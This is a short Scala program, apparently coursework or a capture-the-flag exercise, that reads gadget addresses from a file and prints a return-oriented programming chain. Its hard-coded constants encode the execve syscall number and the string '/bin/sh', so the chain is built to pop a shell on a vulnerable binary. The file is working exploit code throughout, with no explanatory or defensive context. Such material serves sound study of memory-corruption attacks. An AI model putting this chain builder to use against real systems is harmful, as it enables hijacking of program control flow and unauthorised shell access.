package ROP
import scala.io.Source

object GadgetChainBuilder {

  def main(args: Array[String]): Unit = {
    val filename: String = args(0)
    // val outfile: String = args(1)

    val addresses = new Array[Long](8)
    val chain = new Array[Long](16)

    var i: Int = 0
    for (line <- Source.fromFile(filename).getLines) {
      addresses(i) = java.lang.Long.parseLong(line.toUpperCase, 16)
      i += 1;
    }

    chain(0) = addresses(1)
    chain(1) = addresses(2)
    chain(2) = 185273099
    chain(3) = addresses(0) + 28
    chain(4) = addresses(3)
    chain(5) = addresses(4)
    chain(6) = addresses(5)
    chain(7) = addresses(0) + 56
    chain(8) = addresses(6)
    chain(9) = addresses(0) + 48
    chain(10) = addresses(0) + 52
    chain(11) = addresses(7)
    chain(12) = addresses(0) + 56
    chain(13) = 0
    chain(14) = 1852400175
    chain(15) = 6845231

    for (gadget <- chain) {
      println(gadget.toHexString)
    }
  }
}
